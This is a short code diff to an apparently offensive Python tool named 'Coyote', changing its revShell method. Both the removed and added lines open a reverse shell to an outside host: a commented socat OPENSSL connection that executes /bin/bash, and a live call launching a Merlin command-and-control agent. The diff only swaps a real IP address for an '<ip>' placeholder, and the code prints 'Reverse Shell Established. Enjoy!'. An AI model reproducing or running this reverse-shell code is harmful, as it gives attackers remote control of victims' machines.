@@ -259,8 +259,8 @@ class Coyote():
     def revShell(self):
 
         try:
-            #shell = subprocess.Popen(["socat", "OPENSSL:34.213.220.227:443,verify=0", "EXEC:/bin/bash"], stdin=PIPE, stdout=PIPE)
-            shell = os.system("cd /mnt/win_share/Coyote && ./merlin-agent -url https://34.213.220.227")
+            #shell = subprocess.Popen(["socat", "OPENSSL:<ip>:443,verify=0", "EXEC:/bin/bash"], stdin=PIPE, stdout=PIPE)
+            shell = os.system("cd /mnt/win_share/Coyote && ./merlin-agent -url https://<ip>")
             print("    [+] Reverse Shell Established. Enjoy!")
         except Exception as err:
             print("[+] Reverse Shell Failed -> " + str(err))
